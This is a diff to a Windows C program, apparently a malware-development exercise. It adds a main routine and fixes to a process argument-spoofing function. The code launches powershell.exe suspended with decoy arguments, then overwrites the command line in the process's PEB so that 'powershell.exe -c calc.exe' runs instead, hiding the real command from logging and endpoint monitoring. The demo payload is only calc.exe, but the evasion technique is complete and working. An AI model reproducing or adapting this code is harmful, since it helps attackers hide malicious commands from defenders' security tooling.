@@ -1,5 +1,16 @@
 #include "NATIVE_Functions.h"
 
+// disable error 4996 (caused by sprint)
+#pragma warning (disable:4996)
+
+
+/*
+	sizeof(STARTUP_ARGUMENRS) > sizeof(REAL_EXECUTED_ARGUMENTS)
+*/
+wchar_t STARTUP_ARGUMENRS[] = L"powershell.exe HELLO WORLD";
+wchar_t REAL_EXECUTED_ARGUMENTS[] = L"powershell.exe -c calc.exe";
+
+
 BOOL ReadFromTargetProcess(IN HANDLE hProcess,IN PVOID pAddress ,OUT PVOID* ppReadBuffer,IN DWORD dwBufferSize) {
 	SIZE_T sNmbrOfBytesRead = NULL;
 	*ppReadBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBufferSize);
@@ -36,7 +47,7 @@ BOOL CreateArgSpooferProcess(IN LPWSTR szStartupArg, IN LPWSTR szRealArg, OUT DW
 	PROCESS_INFORMATION Pi = { 0 };
 	CHAR WnDr[MAX_PATH];
 	PROCESS_BASIC_INFORMATION PBI = { 0 };
-	LPCSTR lpProcessName;
+	LPCSTR lpProcessName = "powershell.exe";
 	ULONG uReturn = NULL;
 	PPEB pPeb = NULL;
 
@@ -63,9 +74,9 @@ BOOL CreateArgSpooferProcess(IN LPWSTR szStartupArg, IN LPWSTR szRealArg, OUT DW
 
 
 	lstrcpyW(szProcess, szStartupArg);
-	if (!CreateProcessW(NULL, szStartupArg, NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, lpPath, &Si, &Pi)) {
+	if (!CreateProcessW(NULL, szStartupArg, NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, L"C:\\Windows\\System32\\",&Si, &Pi)) {
 
-		printf("\t[!] CreateProcessA Failed with Error : %d \n",GetLastError());
+		printf("\t[!] CreateProcessW Failed with Error : %d \n",GetLastError());
 		return FALSE;
 	}
 
@@ -126,4 +137,34 @@ BOOL CreateArgSpooferProcess(IN LPWSTR szStartupArg, IN LPWSTR szRealArg, OUT DW
 		return TRUE;
 	return FALSE;
 
+}
+
+
+
+int main() {
+
+	HANDLE		hProcess = NULL,
+				hThread = NULL;
+
+	DWORD		dwProcessId = NULL;
+
+
+
+	wprintf(L"[i] Target Process  Will Be Created With %s \n", STARTUP_ARGUMENRS);
+	wprintf(L"[i] The Actual Arguments %s \n", REAL_EXECUTED_ARGUMENTS);
+
+
+	if (!CreateArgSpooferProcess(STARTUP_ARGUMENRS, REAL_EXECUTED_ARGUMENTS, &dwProcessId, &hProcess, &hThread)) {
+		return -1;
+	}
+
+
+
+
+	printf("\n[#] Press <Enter> To Quit ... ");
+	getchar();
+	CloseHandle(hProcess);
+	CloseHandle(hThread);
+
+	return 0;
 }
